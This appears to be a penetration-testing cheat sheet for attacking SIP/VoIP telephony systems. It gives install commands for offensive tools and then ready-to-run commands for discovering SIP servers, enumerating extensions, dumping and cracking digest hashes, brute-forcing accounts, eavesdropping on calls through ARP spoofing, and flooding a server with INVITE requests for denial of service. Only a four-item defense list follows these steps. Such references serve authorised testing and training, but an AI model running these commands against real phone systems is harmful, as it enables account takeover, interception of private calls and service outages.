
# Notes
- SIP: Session Initiation Protocol
- SIP over `TLS` encrypts and secures the call signaling and control messages.
- `SRTP` encrypts and protects the actual voice/video media sent during calls.
- SIP Integrates with protocols like `RTP` (Real-Time Transport Protocol) and `SDP` (Session Description Protocol) for media delivery.
- Private Branch Exchange (PBX)

# Tools

```
git clone https://github.com/EnableSecurity/sipvicious.git
cd sipvicious && sudo python setup.py install
```

```
git clone https://github.com/fozavci/viproy-voipkit.git
cd viproy-voipkit && chmod +x kaliinstall.sh && sudo ./kaliinstall.sh
```
   
```
git clone https://github.com/rbagrov/SIPTools.git
cd SIPTools && sudo pip install -r requirements-dev.in
```

```
sudo apt install inviteflood
sudo apt install voiphopper
```


# Discover SIP Servers

```
python svmap 172.16.0.0/16
```
# Identify Valid Extensions 

```
python svwar.py -e 50001-50099  SRV_IP -m REGISTER|INVITE|OPTIONS
```

# Traffic Dump

```
sipdump -i eth0 sip_hashes.txt
```

# Crack SIP `MD5` Digest `Hashs`


```
sipcrack -w wordlist.txt sip_hashes.txt
```

# Brute-Force SIP Server

50088 is extension from the previously enumerated
```
python svcrack.py -u 50088 -d wordlist.txt  SIP_SRV
```

# Eavesdrop

```
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t victim gateway
arpspoof -t gateway victim
```

# Denial of Service

```
inviteflood etho 50088  SRV_IP SRV_IP 10000000
```
or 
```
Sending a crafted BYE request to end calls?
```
# Defense
- `TLS`
- Digest authentication
- IP whitelisting
- `VLAN`

